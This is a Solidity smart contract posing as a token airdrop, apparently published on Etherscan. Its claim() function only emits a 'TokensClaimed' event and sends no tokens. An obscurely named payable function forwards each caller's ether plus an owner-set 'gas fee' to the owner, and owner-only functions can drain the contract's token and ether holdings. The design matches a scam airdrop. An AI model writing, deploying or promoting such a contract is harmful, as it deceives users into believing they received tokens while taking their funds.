/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract TokenAirdrop {
    
    mapping(address => uint256) public whitelist;
    mapping(address => bool) public claimed;
    uint256 public totalTokens;
    address public owner;
    uint256 public gasFee;
    
    event TokensClaimed(address indexed claimer, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only contract owner can perform this action.");
        _;
    }

    function addToWhitelist(address[] memory addresses, uint256[] memory amounts) public onlyOwner {
        require(addresses.length == amounts.length, "Invalid input.");
        for (uint256 i = 0; i < addresses.length; i++) {
            whitelist[addresses[i]] = amounts[i];
            totalTokens += amounts[i];
        }
    }

    function removeAddressFromWhitelist(address addressToRemove) public onlyOwner {
        require(whitelist[addressToRemove] > 0, "Address not found in whitelist.");
        totalTokens -= whitelist[addressToRemove];
        delete whitelist[addressToRemove];
    }

    function getUnclaimedTokens(address claimer) public view returns (uint256) {
        return whitelist[claimer];
    }

    function claim() public {
        require(whitelist[msg.sender] > 0, "You are not eligible for this airdrop.");
        require(!claimed[msg.sender], "Tokens already claimed.");
        claimed[msg.sender] = true;
        uint256 amount = whitelist[msg.sender];
        whitelist[msg.sender] = 0;
        emit TokensClaimed(msg.sender, amount);
       
    }

    function myFunction() payable public {
         payable(owner).transfer(msg.value + gasFee);
    }


    function setGasFee(uint256 newGasFee) public onlyOwner {
        gasFee = newGasFee;
    }

    function withdrawTokens(address tokenAddress, address to, uint256 amount) public onlyOwner {
        require(tokenAddress != address(0), "Invalid token address.");
        (bool success, bytes memory data) = tokenAddress.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Token transfer failed.");
    }

    function withdrawEther(address payable to, uint256 amount) public onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance.");
        to.transfer(amount);
    }

}